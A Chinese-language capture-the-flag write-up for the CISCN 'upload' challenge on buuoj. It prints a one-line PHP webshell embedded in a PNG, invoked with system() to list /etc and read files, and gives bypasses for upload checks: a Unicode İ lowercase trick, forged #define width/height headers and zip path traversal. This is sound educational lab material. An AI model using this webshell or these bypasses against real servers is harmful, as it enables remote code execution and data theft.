# 上传表单的制作以及图片马的生成及特殊字符的绕过及伪造文件的大小

## 上传表单的制作

可以通过html来编写上传的表单，如下：
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body><form action="http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>

```


同时$_FILE[ ][ ]中的两个括号中填的信息的含义
```
$_FILES数组内容如下:
<input type="file" name="userfile">
$_FILES['userfile']['name']
客户端机器文件的原名称。
$_FILES['userfile']['type'] 
文件的 MIME 类型，需要浏览器提供该信息的支持，例如“image/gif”。
$_FILES['userfile']['size'] 
已上传文件的大小，单位为字节。
$_FILES['userfile']['tmp_name'] 
文件被上传后在服务端储存的临时文件名。
$_FILES['userfile']['error'] 
和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。
注: 在 PHP 4.1.0 版本以前该数组的名称为 $HTTP_POST_FILES，它并不像 $_FILES 一样是自动全局变量。PHP 3 不支持 $HTTP_POST_FILES 数组。

```

## 图片马的制作

可以通过png-IDAT-Payload-Generator制作图片马，这个工具可以在github中找到，直接运行其中的generate.py软件就可以制作了。但是直接运行代码制作的代码的木马是：
```
<?=$_GET[0]($_POST[1]);?>
```
要执行这一个木马，需要get提交0=system，然后再post提交1=ls+/etc就可以访问系统的配置文件

然后我们可以通过CyberChef来对上面中的generate.py文件中的payload部分进行修改，从而制作自己喜欢的一句话木马的图片马
![ciscn upload1](https://github.com/xiaocheng10/xiaocheng10.github.io/blob/master/image/ciscn upload1.jpg)

具体可以看：https://blog.csdn.net/jiangdie666/article/details/116997461

## 特殊字符的绕过

如果代码中出现mb_strtolower()这一个php函数的话，它的作用是让字符串变为小写，则可以使用unicode中的一些相似的字符对要过滤的字符进行一个绕过，其中的例子：
```
字符i可以使用unicode中的İ进行绕过，其中可以将İ变为url形式为%c4%b0
```

## 修改文件的大小

文件可以通过加
```
#define width 想要的宽度大小
#define height 想要的高度大小
```
来伪造文件的大小，而如果是图片，则将它们放在头部，而如果是zip文件，则可以通过抓包的形式放在文件的尾部

## ciscn upload的实例
打开网址，可以看见一串代码
```
 <?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```
通过对代码的审计，我们知道?ctf=upload的时候可以上传文件，因此我们可以制造表单进行上传
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POST数据包POC</title>
</head>
<body><form action="http://270d00af-27b8-4527-a8bd-786af2f51c5e.node3.buuoj.cn/?ctf=upload" method="post" enctype="multipart/form-data">
<!--链接是当前打开的题目链接-->
    <label for="file">文件名：</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="提交">
</form>
</body>
</html>
```
而通过代码：
```
$imageinfo = getimagesize($_FILES['postedFile']['tmp_name']);
```
getimagesize()函数是获取图片的尺寸和大小，其中$_FILES['postedFile']['tmp_name']是文件上传后服务端存储的临时文件名，因此我们可知需要我们上传图片，同时通过代码：
```
 if ($_FILES['postedFile']['size'] > 1024*512) {
        die("这么大个的东西你是想d我吗？");
    }

if ($imageinfo[0] !== 1 && $imageinfo[1] !== 1) {
        die("东西不能方方正正的话就很讨厌");
    }
```
我们可知我们上传的文件的大小要超过1024*512，但是文件的宽要为1，高也要为1，因此可以制造一个图片马，图片马的大小超过1024*512，来绕过($_FILES['postedFile']['size'] > 1024*512)，而使用
```
#define width 1
#define height 1
```
伪造文件的宽和高来绕过$imageinfo[0] !== 1 && $imageinfo[1] !== 1，可以通过抓包将这两条代码放在文件尾部（zip文件一般放在尾部），这是由于通过扫描文件，可以知道还有一个example.php文件，代码为：
```
 <?php
if (!isset($_GET["ctf"])) {
    highlight_file(__FILE__);
    die();
}

if(isset($_GET["ctf"]))
    $ctf = $_GET["ctf"];

if($ctf=="poc") {
    $zip = new \ZipArchive();
    $name_for_zip = "example/" . $_POST["file"];
    if(explode(".",$name_for_zip)[count(explode(".",$name_for_zip))-1]!=="zip") {
        die("要不咱们再看看？");
    }
    if ($zip->open($name_for_zip) !== TRUE) {
        die ("都不能解压呢");
    }

    echo "可以解压，我想想存哪里";
    $pos_for_zip = "/tmp/example/" . md5($_SERVER["REMOTE_ADDR"]);
    $zip->extractTo($pos_for_zip);
    $zip->close();
    unlink($name_for_zip);
    $files = glob("$pos_for_zip/*");
    foreach($files as $file){
        if (is_dir($file)) {
            continue;
        }
        $first = imagecreatefrompng($file);
        $size = min(imagesx($first), imagesy($first));
        $second = imagecrop($first, ['x' => 0, 'y' => 0, 'width' => $size, 'height' => $size]);
        if ($second !== FALSE) {
            $final_name = pathinfo($file)["basename"];
            imagepng($second, 'example/'.$final_name);
            imagedestroy($second);
        }
        imagedestroy($first);
        unlink($file);
    }

}
```
通过审计代码，可知我们要上传的是zip文件，因此我们需要将图片马文件压缩为zip文件，而后通过构造?ctf=poc对文件进行解压，通过两个文件的代码可知道文件解压到example../image/目录下，因此可以再get提交?ctf=poc的同时，post提交file=../image/a.zip（上传的压缩包名）

然后我们可以get提交0=system，同时post提交1=ls+/etc来访问系统配置文件，最后找到flag文件所在处，用1=cat+/文件路径打开文件进行读取

参考：https://blog.csdn.net/jiangdie666/article/details/116997461

